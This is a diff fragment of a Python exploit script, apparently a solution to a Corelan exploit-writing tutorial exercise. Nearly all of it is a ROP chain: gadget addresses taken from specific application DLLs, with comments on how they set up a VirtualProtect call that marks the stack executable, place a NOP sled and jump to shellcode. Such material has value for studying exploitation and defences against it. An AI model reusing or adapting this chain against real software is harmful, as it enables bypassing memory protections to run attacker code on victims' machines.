@@ -2,6 +2,80 @@
 import socket,struct
 
 """
+####################################################################################
+# http://thesprawl.org/research/corelan-tutorial-10-exercise-solution/
+# EDI simply contains ROP NOP because we need to have
+# VirtualProtect in ESI so that  lpAddress (ESP) is automatically
+# populated when the PUSHAD is executed.
+0x6403650e, # POP EDI # RETN [MediaPlayerCtrl.dll] 
+0x61646807, # RETN (ROP NOP) [EPG.dll]
+
+# Store VirtualProtect() in ESI
+# The reason we store VirtualProtect in ESI and not in EDI
+# is because we want to take advantage of ESP being automatically
+# pushed on the stack by the PUSHAD instruction.
+0x61642aac, # PUSH EAX # POP ESI # RETN 04 [EPG.dll]
+
+# Store Return Address in EBP
+# The goal of this instruction is to simply transfer execution flow to the
+# stack and our shellcode. PUSH ESP # RET 04 is equivalent to JMP ESP.
+# ESP will be pointing to the contents obtained from EAX since everything
+# else will be popped from the stack by the VirtualProtect call.
+0x6410ba9b, # POP EBP # RETN [NetReg.dll] 
+0x41414141, # Filler (RETN offset compensation)
+0x61608b81, # & push esp #  ret 04 [EPG.dll]
+
+# lpAddress will be automatically populated by the PUSHAD instruction.
+# PUSHAD will simply take the address stored in ESP just before it is executed
+# and push it on the stack right after EBP (ReturnAddress). With this in mind
+# it is convenient to place our shellcode immediately after the PUSHAD
+# instruction.
+
+# Store dwSize in EBX. 
+# 512 bytes from the end of the chain will be marked as Executable. This
+# value can be adjusted based on the actual shellcode size using negative
+# complement to avoid null bytes.
+0x6403bed6, # POP EAX # RETN [MediaPlayerCtrl.dll] 
+0xfffffdff, # Value to negate, will become 0x00000201
+0x640377e0, # NEG EAX # RETN [MediaPlayerCtrl.dll] 
+0x6163dd7f, # PUSH EAX # ADD AL,5E # POP EBX # RETN [EPG.dll]
+
+# Store NewProtect in EDX. 
+# 0x40 is equivalent to PAGE_EXECUTE_READWRITE
+0x64114086, # POP EAX # RETN [NetReg.dll] 
+0xffffffc0, # Value to negate, will become 0x00000040
+0x6002d513, # NEG EAX # RETN [Configuration.dll] 
+0x640148ce, # XCHG EAX,EDX # RETN 02 [MediaPlayerCtrl.dll]
+
+# Store lpOldProtect in ECX
+# The address 0x6404fffb is writeable
+0x6002e5c3, # POP ECX # RETN [Configuration.dll] 
+0x4141,     # Filler (RETN offset compensation)
+0x6404fffb, # &Writable location [MediaPlayerCtrl.dll]
+
+# EAX is set to a regular NOP sled as it will become the 
+# beginning of the executed shellcode once JMP ESP is executed
+0x6162f773, # POP EAX # RETN [EPG.dll] 
+0x90909090, # nop
+#####################################################################################
+# PUSHAD will push registers on the stack while moving ESP
+# register to point to the first pushed register as follows.
+# 
+#   Stack:
+#   EDI (ROP NOP)       <---- ESP now points here
+#   ESI (VirtualProtect)
+#   EBP (ReturnAddress)
+#   ESP (lpAddress)
+#   EBX (dwSize)
+#   EDX (flNewProtect)
+#   ECX (lpflOldProtect)
+#   EAX (NOP)
+#
+# After PUSHAD is executed the RETN will transfer execution
+# back to the stack precisely where ROP NOP address was pushed
+# from EDI.
+0x6002ea81, # PUSHAD # RETN [Configuration.dll]
+
 #----------------------------------------#
 # ROP Chain setup for VirtualProtect()   #
 #----------------------------------------#
